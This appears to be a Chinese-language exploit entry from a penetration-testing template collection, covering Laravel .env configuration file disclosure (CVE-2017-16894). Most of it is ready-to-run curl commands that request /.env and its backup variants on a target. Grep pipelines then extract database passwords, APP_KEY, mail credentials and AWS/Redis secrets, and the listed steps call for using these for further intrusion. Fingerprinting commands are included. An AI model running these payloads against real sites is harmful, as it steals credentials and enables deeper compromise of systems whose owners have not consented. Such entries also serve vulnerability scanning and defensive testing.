---
id: LARAVEL-ENV-LEAK
title: Laravel .env 配置文件泄露漏洞
product: laravel
vendor: Laravel
version_affected: "Laravel <= 5.5.21 (and misconfigured deployments)"
severity: HIGH
tags: [info_disclosure, 无需认证]
fingerprint: ["Laravel", "laravel", "X-Powered-By: Laravel"]
---

## 漏洞描述

Laravel 框架在部署配置不当时，项目根目录下的 `.env` 配置文件可被直接通过 HTTP 请求下载，该文件通常包含数据库凭据、APP_KEY、邮件服务密码、第三方 API 密钥等敏感信息。在 Laravel 5.5.21 及之前版本中，此问题尤为突出（CVE-2017-16894）。

## 影响版本

- Laravel <= 5.5.21（CVE-2017-16894）
- 任何 Web 服务器配置不当导致 .env 文件可直接访问的 Laravel 应用

## 前置条件

- 无需认证
- Web 服务器未正确配置拒绝对 .env 文件的访问

## 利用步骤

1. 直接请求 `/.env` 文件
2. 解析获取的敏感信息（数据库密码、APP_KEY 等）
3. 利用获取的凭据进一步渗透

## Payload

```bash
# 直接读取 .env
curl -s "http://target/.env"

# 常见变体路径
curl -s "http://target/.env.bak"
curl -s "http://target/.env.old"
curl -s "http://target/.env.save"
curl -s "http://target/.env.example"
curl -s "http://target/.env.production"
curl -s "http://target/.env.local"
```

### 提取关键信息

```bash
# 提取数据库密码
curl -s "http://target/.env" | grep -i "DB_PASSWORD\|DB_USERNAME\|DB_HOST"

# 提取 APP_KEY（可用于反序列化攻击）
curl -s "http://target/.env" | grep "APP_KEY"

# 提取邮件配置
curl -s "http://target/.env" | grep -i "MAIL_PASSWORD\|MAIL_USERNAME"

# 提取 AWS/云服务凭据
curl -s "http://target/.env" | grep -i "AWS_\|S3_\|REDIS_"
```

## 验证方法

```bash
curl -s "http://target/.env" | grep "APP_NAME\|APP_KEY\|DB_PASSWORD"
```

## 指纹确认

```bash
curl -s http://target/ | grep -i "laravel"
curl -s -I http://target/ | grep -i "laravel\|Set-Cookie.*laravel_session"
```

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2017-16894
